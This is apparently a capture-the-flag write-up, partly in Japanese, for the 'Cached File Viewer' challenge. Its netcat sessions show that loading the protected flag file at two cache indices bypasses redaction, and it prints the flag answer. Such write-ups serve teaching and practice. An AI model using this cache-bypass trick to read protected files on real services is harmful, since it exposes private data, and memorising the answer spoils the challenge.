# Cached File Viewer:misc:113pts
I implemented a simple file viewer!  

```
> ls ~
99-bottles-of-bear.txt  chal  diary.txt  flag  recipe.txt  start.sh
```

`nc 34.146.186.1 21001`  

[file_viewer.tar.gz](file_viewer.tar.gz)  

# Solution
ホームのファイル一覧(`ls ~`の結果)、ソース、接続先が渡される。  
接続するとファイルを読み込むサービスのようだ。  
```bash
$ nc 34.146.186.1 21001
1. load_file
2. read
3. bye
choice > 1
index > 0
filename > diary.txt
Read 262 bytes.
1. load_file
2. read
3. bye
choice > 2
index > 0
content: - 202X/12/13
I set the password for my bank account, but it's a random string, so I'm afraid I'll forget it...
Oh, I know! I'll save it in the `flag` file just in case I forget it!
- 202X/12/14
This is just flavor text and is not related to solving the problem!

1. load_file
2. read
3. bye
choice > 1
index > 0
filename > flag
Read 22 bytes.
content: - 202X/12/13
I set the password for my bank account, but it's a random string, so I'm afraid I'll forget it...
Oh, I know! I'll save it in the `flag` file just in case I forget it!
- 202X/12/14
This is just flavor text and is not related to solving the problem!

Overwrite loaded file? (y/n) > y
1. load_file
2. read
3. bye
choice > 2
index > 0
content: **redacted**
```
もちろん`flag`は読めないらしい。  
問題名よりキャッシュのバグで二度読み取ると何らかのバイパスが生じると考え、ブラックボックスで試す。  
```bash
$ nc 34.146.186.1 21001
1. load_file
2. read
3. bye
choice > 1
index > 0
filename > flag
Read 22 bytes.
1. load_file
2. read
3. bye
choice > 1
index > 1
filename > flag
1. load_file
2. read
3. bye
choice > 2
index > 1
content: TSGCTF{!7esuVVz2n@!Fm}
1. load_file
2. read
3. bye
```
flagが得られた。  

## TSGCTF{!7esuVVz2n@!Fm}